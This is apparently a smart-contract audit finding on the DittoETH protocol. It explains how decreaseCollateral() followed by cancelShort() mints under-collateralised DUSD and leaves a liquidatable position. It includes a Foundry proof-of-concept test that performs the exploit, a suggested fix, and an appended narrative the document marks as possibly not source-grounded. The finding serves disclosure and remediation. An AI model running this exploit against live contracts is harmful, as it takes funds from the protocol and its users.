---
id: 21684
severity: "High"
---

# An attacker can mint free DUSD and liquidate the corresponding Short Record to earn liquidation rewards

## Description

An attacker can use `decreaseCollateral()` function to reduce the collateral of a Short Record (SR) and `cancelOrder()` to cancel the corresponding Short Order having a collateral ratio < 1. The Short Record ends up having less collateral than debt and is now liquidatable.

A user can create a Short Order with a collateral ratio (CR) of less than 1. The protocol ensures that at least `minShortErc` in the Short Orders Short Record has enough collateral by filling the Short Record with collateral to cover `minShortErc` before the Short Order is matched or placed on the order book.

In addition, during the match the bid also provides equivalent collateral to the `ercDebt` it creates. So if the Short Order CR is 0.7 it ends up being 1.7 CR after matching.

By utilising the `cancelShort()` and `decreaseCollateral()` functions on a short Order with CR < 1, an attacker can create free DUSD and make the Short Record liquidatable.

The [cancelShort()](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L923-L995) function lets the caller cancel a Short Order. If the `ercDebt` is smaller than `minShortErc` as shown in line 953 below, it mints the difference to the shorter (i.e the address that created the Short Order) in line 982. The amount of collateral needed is calculated in line 960 and uses `cr`. `cr` is the collateral ratio and if it is less than 1 then the protocol would be minting DUSD with lesser collateral. But since it has already ensured that `minShortErc` has enough collateral in the Short Record before the Short Order was created, this shouldn’t be a problem.

**[LibOrders.sol#L946-L976](https://github.com/code-423n4/2024-07-dittoeth/blob/ca3c5bf8e13d0df6a2c1f8a9c66ad95bbad35bce/contracts/libraries/LibOrders.sol#L946-L976)**

```solidity
            if (shortRecord.ercDebt < minShortErc) {
                // @dev prevents leaving behind a partially filled SR under minShortErc
                // @dev if the corresponding short is cancelled, then the partially filled SR's debt will == minShortErc
                uint88 debtDiff = uint88(minShortErc - shortRecord.ercDebt); // @dev(safe-cast)
                {
                    STypes.Vault storage Vault = s.vault[vault];
                    // @audit-issue the collateral could be bad if price moved.
                    uint88 collateralDiff = shortOrder.price.mulU88(debtDiff).mulU88(cr);

                    LibShortRecord.fillShortRecord(
                        asset,
                        shorter,
                        shortRecordId,
                        SR.FullyFilled,
                        collateralDiff,
                        debtDiff,
                        Asset.ercDebtRate,
                        Vault.dethYieldRate,
                        0
                    );

                    Vault.dethCollateral += collateralDiff;
                    Asset.dethCollateral += collateralDiff;
                    Asset.ercDebt += debtDiff;

                    // @dev update the eth refund amount
                    eth -= collateralDiff;
                }
                // @dev virtually mint the increased debt
                s.assetUser[asset][shorter].ercEscrowed += debtDiff;
            } else {
```

The [decreaseCollateral()](ShortRecordFacet.sol#L83-L107) function lets the caller reduce the collateral he has in the Short Record.

An attacker can use `decreaseCollateral()` to reduce the collateral of the Short Record before cancelling. Thus, removing the collateral added for `minShortErc` and the protocol ends up minting DUSD with less Ethereum collateral.

The attacker earns the DUSD minted while providing less collateral value. The Short Record will become liquidatable and the attacker can further liquidate it to earn liquidation rewards.

The protocol mints DUSD for free and pays liquidation rewards when the bad debt position is liquidated.

## Proof of Concept

To execute the POC the Short Record has to have debt so that `decreaseCollateral()` and `cancelShort()` can be called on it successfully. To do this, the POC creates two Short Orders, a normal Short Order and the other with CR < 1. It then uses a bid order to fill the normal Short Order and a tiny amount of the order with CR < 1.

The test can be run in the `Shorts.t.sol` file.

```solidity
        // Add the import below
        // import {STypes, MTypes, O, SR} from "contracts/libraries/DataTypes.sol";

        function test_StealDUSD() public {
            // set default Collateral Ratios
            vm.startPrank(owner);
            diamond.setInitialCR(asset, 170);
            diamond.setLiquidationCR(asset, 150);
            vm.stopPrank();

            initialCR = 170;
            uint80 price = DEFAULT_PRICE;
            uint88 amount = DEFAULT_AMOUNT;
            uint88 minShortErc = 2000 ether;

            // add a normal short order to fill the bid
            fundLimitShortOpt(price, amount, sender);
            // sender has 0 ethEscrowed
            assertEq(diamond.getVaultUserStruct(vault, sender).ethEscrowed, 0);
            depositEth(sender, price.mulU88(minShortErc).mulU88(1.7e18));
            uint initialEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
            
            // creates a Short Order with CR = 0.7
            uint16[] memory shortHintArray = setShortHintArray();
            MTypes.OrderHint[] memory orderHintArray = diamond.getHintArray(asset, price, O.LimitShort, 1);
            vm.prank(sender);
            diamond.createLimitShort(asset, price, minShortErc, orderHintArray, shortHintArray, 70);        
    
            // creates a Bid which completely fills the first Short Order and only fills 
            // 100000 wei in the second WEI
            fundLimitBidOpt(price, amount +  100000, receiver);

            assertEq(diamond.getAssetUserStruct(asset, sender).ercEscrowed, 0);
            vm.startPrank(sender);
            // decreases collateral by 499999999999999958, the collateral added to cover minShortErc is
            // 500000000000000000, but we can't remove everything because the protocol requires us to cover
            // the tiny debt we created
            decreaseCollateral(3, 499999999999999958); 
            cancelShort(101);
            
            uint finalEth = diamond.getVaultUserStruct(vault, sender).ethEscrowed;
            uint ercEscrowed = diamond.getAssetUserStruct(asset, sender).ercEscrowed;
            // profit ~= 0.15 ether ( price.mulU88(ercEscrowed) - initialEth-finalEth )
            assertGt(price.mulU88(ercEscrowed), initialEth-finalEth); 
            // the attacker can also decide to liquidate the position and earn more rewards
            assertLt(diamond.getCollateralRatio(asset, getShortRecord(sender, 3)), 150e18);
        }
```

## Recommendation

Consider adding a check to `cancelOrder()` to ensure the resulting SR Collateral Ratio is not below the redemption and liquidation collateral ratios.

```solidity
            if (cRatio < LibOrders.max(LibAsset.liquidationCR(asset), C.MAX_REDEMPTION_CR)) {
                revert Errors.ShortBelowCRThreshold();
            }
```

> Good find, will fix this issue in `decreaseCollateral()` instead of `cancelShort()`.

## Derived Narrative

The following field is derived content and may not be source-grounded:

An attacker can exploit the short‑position workflow to mint DUSD without providing sufficient Ethereum collateral and then liquidate the under‑collateralised short record to collect liquidation rewards. The root cause is that the cancelShort function mints the difference between the minimum short debt and the actual debt without verifying that the resulting collateral ratio (CR) remains above the protocol’s liquidation or redemption thresholds. When a short order is created with a collateral ratio below one, the protocol initially adds collateral to satisfy the minimum debt requirement. However, the decreaseCollateral function allows the caller to withdraw most of that added collateral before cancelling the order. Because cancelShort still mints the missing debt based on the original minimum‑debt calculation, the short record ends up with less collateral than debt, making it liquidatable. An attacker can then trigger a liquidation and receive the reward, effectively creating free DUSD. This situation occurs when a user creates a short order with CR<1, later reduces its collateral via decreaseCollateral, and finally calls cancelShort. The vulnerability primarily affects the attacker who gains unearned DUSD and any protocol participants who may suffer from distorted accounting, reduced collateral buffers, and unexpected liquidation payouts. It was discovered during a security audit that examined the interaction between short order cancellation and collateral management, and it is subtle because the protocol does enforce a minimum debt collateralisation before order placement, giving a false sense of safety. The bug violates the fundamental accounting assumption that every minted DUSD is backed by at least the required amount of collateral, leading to a scenario where funds disappear from the system’s perspective while the attacker pockets newly minted tokens and liquidation fees. To remediate, the contract should enforce a post‑cancellation collateral‑ratio check that ensures the short record’s CR does not fall below the greater of the liquidation and redemption ratios, preventing the creation of under‑collateralised debt.
